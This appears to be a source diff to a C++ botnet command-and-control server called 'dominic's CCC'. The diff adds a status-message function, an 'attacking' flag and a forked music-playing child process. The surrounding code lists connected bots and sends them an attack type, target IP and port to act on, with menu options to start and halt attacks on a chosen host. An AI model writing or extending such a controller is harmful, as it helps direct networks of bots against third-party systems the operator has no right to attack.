@@ -14,6 +14,7 @@ using namespace std;
 
 bool start = false;
 bool server_started = false;
+bool attacking = false;
 
 string attack = "None";
 string target_ip = "None";
@@ -31,6 +32,36 @@ struct netbot {
 
 vector<netbot> netbots;
 string message;
+
+pid_t pid;
+
+string server_status()
+{	
+	if (attacking == true) 
+	{
+		return "\nServer attacking (" + attack + ") target: " + target_ip + "\n";
+	}
+	else if (target_ip == "None" && attack == "None" && start == false)
+	{
+		return "\nServer started, waiting for client connections...\n";
+	}
+	else if (attack == "HALT" && target_ip != "None")
+	{
+		return "\nAttack halted. Waiting for commands.\n";
+	}
+	else if (start == true && attack == "None")
+	{
+		return "\nPlease, enter attack type.\n";
+	}
+	else if (start == true && target_ip == "None")
+	{
+		return "\nPlease, enter target parameters.\n";
+	}
+	else
+	{
+		return "\nServer started, waiting for client connections...\n";
+	}
+}
 
 void setup_target_parameters()
 {	
@@ -207,6 +238,7 @@ void threaded(int i)
 	       			message = attack;
 	       		} else {
 	       			message = attack + "_" + target_ip + "_" + to_string(target_port);
+	       			attacking = true;
 	       		}
 	       			
 			send(i, message.c_str(), strlen(message.c_str()), 0);
@@ -295,7 +327,7 @@ void start_server()
 		cout << "4. halt attack\n";
 		cout << "5. list connected bots\n";
 		cout << "6. shutdown server\n";	
-		cout << "\nServer started, waiting for client connections...\n";
+		cout << server_status();
 
 		cin >> char_choice;
 		int_choice = atoi(char_choice);
@@ -314,12 +346,14 @@ void start_server()
 				break;
 			case 4: 
 				attack = "HALT";
+				attacking = false;
 				start = true;
 				break;
 			case 5:
 				list_bots();
 				break;
 			case 6:
+				kill(-pid, SIGKILL);
 				shutdown(server_fd, SHUT_RDWR);
 				break;
 			default:
@@ -358,6 +392,7 @@ void main_menu()
 				start_server();
 				break;
 			case 2:
+				kill(-pid, SIGKILL);
 				break;
 			default:
 				cout << "Wrong choice. Enter option again.";
@@ -368,9 +403,15 @@ void main_menu()
 }
 
 int main()
-{
-	// system("canberra-gtk-play -f music/music.wav");
-	main_menu();
-	cout << "\nThank you for using dominic's CCC. Have a great day!";
-	return 0;
+{	
+	pid = fork();
+	if (pid == 0) { // child procress
+		setpgid(getpid(), getpid());
+		system("canberra-gtk-play -f music/music.wav");
+	} else {
+		main_menu();
+		kill(-pid, SIGKILL);
+		cout << "\nThank you for using dominic's CCC. Have a great day!";
+		return 0;
+	}
 }
